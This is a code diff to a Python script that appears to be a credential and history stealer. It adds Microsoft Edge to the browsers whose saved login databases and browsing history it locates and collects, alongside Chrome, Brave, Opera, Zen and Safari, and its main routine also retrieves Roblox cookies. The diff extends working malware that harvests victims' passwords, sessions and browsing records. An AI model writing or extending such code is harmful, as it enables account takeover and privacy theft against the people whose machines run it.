@@ -270,7 +270,8 @@ def get_login_data_path(browser):
             "Opera": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable"),
             "Opera GX": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable"),
             "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data"),
-            "Safari": os.path.join(user_profile, r"Library\Safari")
+            "Safari": os.path.join(user_profile, r"Library\Safari"),
+            "Edge": os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data")
         }
 
         for profile in ["Default", "Profile 1", "Profile 2"]:
@@ -290,7 +291,8 @@ def get_history_path(browser):
             "Opera": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable\History"),
             "Opera GX": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable\History"),
             "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data\Default\History"),
-            "Safari": os.path.join(user_profile, r"Library\Safari\History.db")
+            "Safari": os.path.join(user_profile, r"Library\Safari\History.db"),
+            "Edge": os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data\Default\History")
         }
 
         return history_paths.get(browser)
@@ -379,6 +381,8 @@ def get_browser_history(browser, limit=100):
 
         if browser == "Safari":
             cursor.execute("SELECT url, title, last_visited FROM history_items ORDER BY last_visited DESC LIMIT ?", (limit,))
+        elif browser == "Edge":
+            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
         else:
             cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
         rows = cursor.fetchall()
@@ -422,7 +426,7 @@ if __name__ == "__main__":
     retrieve_roblox_cookies()
 
     # Collect logins and history for each browser
-    browsers = ["Chrome", "Brave", "Opera", "Opera GX", "Zen", "Safari"]
+    browsers = ["Chrome", "Brave", "Opera", "Opera GX", "Zen", "Safari", "Edge"]
     for browser in browsers:
         collect_browser_logins(browser)
         history = get_browser_history(browser, limit=100)
